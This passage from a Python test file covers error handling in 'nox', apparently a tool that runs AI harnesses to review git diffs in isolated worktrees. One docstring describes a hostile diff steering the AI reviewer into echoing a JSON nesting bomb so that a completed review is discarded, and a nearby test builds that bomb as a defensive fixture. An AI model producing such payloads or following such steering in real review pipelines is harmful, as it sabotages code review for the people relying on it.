    that in `_isolating`, so the answer is `error`/`isolation_failed`; the
    pre-flight's copy did not, so the bare `FileNotFoundError` fell through to
    `review()`'s plugin-boundary backstop and came back
    `indeterminate`/`malformed_output` — nox saying it did not know what
    happened about a failure it did know.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    gone = tmp_path / "gone"
    gone.mkdir()
    monkeypatch.chdir(gone)
    gone.rmdir()
    target = ReviewTarget(kind="plan-artifact", path=Path("plan.md"))
    result = api.review(_request(scope="plan-artifact", target=target), repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.ISOLATION_FAILED


def test_a_removed_cwd_with_no_repo_argument_is_refused_and_never_escapes(tmp_path, ambient, install, monkeypatch):
    """C-1029: the eighth operator-error shape — the only one that RAISED out of `review()`.

    `start = Path.cwd() if repo is None else repo` sat ABOVE `with _CALL_LOCK:
    try:`, so a removed working directory and no `--repo` raised
    `FileNotFoundError` through `review()` and out of `cli.main`, while the
    plugin-boundary comment named that exact trigger as one it covered. The
    other seven shapes all answer `INVALID_CONFIG`; this one answered with a
    traceback.

    `repo=None` is the whole point — the sibling test above passes `repo` and so
    never reaches the `Path.cwd()` call. `INVALID_CONFIG` rather than the
    backstop's `indeterminate`, because a deleted cwd is an operator error like
    a mistyped `--repo`, not nox failing to understand what happened.
    """
    del ambient
    install(_Stub())
    gone = tmp_path / "gone"
    gone.mkdir()
    monkeypatch.chdir(gone)
    gone.rmdir()
    result = api.review(_request(), repo=None, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None and "--repo" in result.detail


def test_a_stale_git_keeps_its_own_floor_message_and_is_never_rewritten_as_a_mistyped_commit(
    tmp_path, ambient, install, monkeypatch
):
    """W2: the blanket `except IsolationError` called every `resolve_pair` failure a typo.

    `_check_target`'s own `Raises:` clause says only the commit-ish case is
    converted and that a git that is absent, unrunnable or below the C-1041
    floor "keeps its own word" — a real isolation failure. The blanket catch
    contradicted it, so the fix is to establish that git itself is usable
    *before* any spec is resolved and outside the catch: what is left inside it
    is then the operator's input and nothing else.

    The negative half of the matrix above, and it is the same H13 property from
    the other side. With a stale git the pre-flight used to resolve both specs
    fine — `version_shim` delegates everything but `--version` — so the floor
    was not reached until `workspace()`, long after the probe had already
    answered `ocx: not found as an executable on the minimal PATH`. The operator
    was told to install a harness because their *git* was too old for
    `GIT_CONFIG_COUNT`, which is the one thing C-1041 exists to say out loud.
    """
    del ambient
    shim = version_shim(tmp_path, "git version 2.30.0")
    monkeypatch.setenv("PATH", f"{shim}{os.pathsep}{os.environ['PATH']}")
    repo = make_repo(tmp_path)
    install(_Stub(raises={"probe": _absent_probe()}))
    request = _request(target=ReviewTarget(kind="ref", ref="HEAD", base=repo.base))
    result = api.review(request, repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.ISOLATION_FAILED
    assert result.detail is not None
    assert "2.30.0" in result.detail
    assert "does not name a commit" not in result.detail
    assert "ocx" not in result.detail


def test_a_base_naming_no_commit_refuses_as_invalid_config_and_names_the_flag_and_its_value(tmp_path, ambient, install):
    """`isolation_failed` on a typo reads as a containment breach, and named neither flag nor value.

    The old refusal was `git rev-parse failed (128): <git's own stderr>` under
    `FailureReason.ISOLATION_FAILED` — the reason a consumer reads as "the
    ephemeral worktree could not be kept away from the repository". A commit-ish
    that does not resolve is the operator's input, which is what
    `INVALID_CONFIG` means, and the message has to carry the flag and the value
    the way the `--path` refusals already do.
    """
    del ambient
    repo = make_repo(tmp_path)
    install(_Stub())
    request = _request(target=ReviewTarget(kind="ref", ref="HEAD", base="no-such-base"))
    result = api.review(request, repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None
    assert "--base" in result.detail
    assert "no-such-base" in result.detail
    assert "rev-parse" not in result.detail


def test_an_absent_launcher_is_reported_as_the_harnesss_launcher_and_not_as_a_bare_word(tmp_path, ambient, install):
    """The operator asked for a harness; `ocx` is a word no user-facing surface of nox mentions.

    `launch_argv` resolves the launcher PREFIX's head, so a harness reachable
    only behind `ocx package exec` reports the wrapper's name when the wrapper
    is what is missing. `resolve_executable` cannot say more — it is handed one
    word — so the sentence is completed here, where the registry key and the
    configured prefix are both in scope.
    """
    del ambient
    _launcher_config(tmp_path)
    repo = make_repo(tmp_path)
    install(_Stub(raises={"probe": _absent_probe()}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.status == "error"
    assert result.reason is FailureReason.ABSENT
    assert result.detail is not None
    assert "stuba" in result.detail
    assert "ocx" in result.detail
    assert "launcher" in result.detail


def test_an_adapters_own_absent_account_is_left_alone_even_behind_a_launcher(tmp_path, ambient, install):
    """An `ABSENT` detail that already names the harness is the adapter's account, not a bare word."""
    del ambient
    _launcher_config(tmp_path)
    repo = make_repo(tmp_path)
    install(_Stub(raises={"probe": _absent_probe("stuba: ran but named no version")}))
    result = api.review(_request(), repo=repo.path, runner=FakeRunner())
    assert result.reason is FailureReason.ABSENT
    assert result.detail == "stuba: ran but named no version"


def test_a_nesting_bomb_is_not_progress_rather_than_a_discarded_review(monkeypatch):
    """C-1010: `json.loads` answers a nested-array bomb with `RecursionError`, which is not a `ValueError`.

    `RecursionError` is a `RuntimeError`, so the `except ValueError` clause never
    saw it: one line of harness output deep enough to exhaust the parser escaped
    `_semantic`, escaped `supervise`, and landed on `review()`'s plugin-boundary
    backstop — which discards a COMPLETED review as `indeterminate`. The harness
    chooses that line, so a hostile diff steering the reviewer into echoing one
    is a one-line denial of service against the review of itself.

    The depth at which `json` actually gives up is interpreter-dependent and
    moves: roughly 1200 on the declared 3.11 floor, above 20000 from 3.12, and
    on 3.14 a literal bomb deep enough to be a bomb everywhere is parsed rather
    than refused. A test that picks a depth therefore pins an interpreter, not a
    contract — so the raise itself is the fixture here, and the sibling test
    below carries the real payload. What is asserted is the clause: whatever
    depth a given interpreter draws the line at, reaching it answers `False`
    rather than propagating out of the discriminator.
    """

    def _boom(_: str) -> object:
        raise RecursionError("maximum recursion depth exceeded while decoding a JSON object")

    monkeypatch.setattr(api.json, "loads", _boom)
    line = '{"a": 1}\n'
    assert api._semantic(line, info_for("stub", heartbeat_kind=Liveness.SEMANTIC)) is False


def test_the_declared_floors_own_nesting_bomb_never_escapes_the_discriminator():
    """The 7202-byte live shape: `json`'s recursion depth is ~1200 on 3.11 and above 20000 from 3.12.

    Which of the two words comes back therefore depends on the interpreter —
    `False` where the parser gives up, `True` where it parses — and the property
    under test is that neither of them is an exception. Asserted as "a bool came
    back" rather than as a value, because pinning the value here would pass on
    3.14 and say nothing about the floor the project declares.
    """
    depth = 1200
    line = '{"a":' * depth + "1" + "}" * depth + "\n"
    assert isinstance(api._semantic(line, info_for("stub", heartbeat_kind=Liveness.SEMANTIC)), bool)


# ---------------------------------------------------------------------------
# E53 — what `review()` hands the git phase
# ---------------------------------------------------------------------------


def test_an_oversized_diff_refuses_the_whole_review_as_invalid_config(tmp_path, ambient, install):
    """C-1028 forbids trimming the evidence; refusing to carry it is the honest alternative."""
    del ambient
    repo = make_repo(tmp_path)
    key = install(_Stub())
    result = api.review(
        _request(harness=key),
        repo=repo.path,
        runner=FakeRunner(),
        config=NoxConfig(review_harness=key, max_prompt_bytes=1),
    )
    assert result.status == "error"
    assert result.reason is FailureReason.INVALID_CONFIG
    assert result.detail is not None and "max_prompt_bytes" in result.detail
    assert result.containment == NOT_RUN, "no harness ran, so nothing was contained"


def test_the_git_phase_is_bound_by_the_runs_remaining_wall_budget(tmp_path, ambient, install, monkeypatch):
    """No new constant and no new key: the deadline is `TimeoutPolicy`'s own wall clock (E54).

    Asserted at two different configured timeouts, because a deadline read off
    a fresh constant satisfies a single-point test exactly as well as one read
    off the policy — the two are only distinguishable by moving the policy.
    """
    del ambient
    repo = make_repo(tmp_path)
    key = install(_Stub())
    seen: list[float | None] = []
    real = api.workspace

    def spy(*args, **kwargs):
        seen.append(kwargs.get("deadline"))
        return real(*args, **kwargs)

    monkeypatch.setattr(api, "workspace", spy)
    for configured in (DEFAULT_TIMEOUT_S, DEFAULT_TIMEOUT_S * 2):
        before = time.monotonic()
        api.review(
            _request(harness=key),
            repo=repo.path,
            runner=FakeRunner(),
            config=NoxConfig(
                review_harness=key,
                harnesses=MappingProxyType({key: HarnessConfig(timeout=configured)}),
            ),
        )
        assert seen[-1] is not None
        # `before` is read before `run.started`, so the span it measures is the
        # budget plus whatever `review()` spent getting to the policy.
        spent = configured - (seen[-1] - before)
        assert -1 < spent < 5, "the git phase gets what is LEFT of the policy's wall clock, not a constant"
